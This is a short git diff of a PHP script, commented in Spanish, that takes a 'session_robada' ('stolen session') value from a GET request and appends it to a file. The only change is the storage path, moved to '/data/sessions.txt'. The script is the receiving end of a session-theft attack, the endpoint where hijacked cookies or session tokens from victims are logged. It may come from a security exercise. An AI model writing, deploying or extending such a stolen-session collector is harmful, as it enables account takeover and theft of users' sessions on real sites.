@@ -1,7 +1,7 @@
 <?php
 $session_robada = $_GET['session_robada'] ?? "";
 $session_robada .= "\n";
-$fichero = 'sessions.txt';
+$fichero = '/data/sessions.txt';
 // Abre el fichero para obtener el contenido existente
 $actual = file_get_contents($fichero);
 // Escribe el contenido al fichero
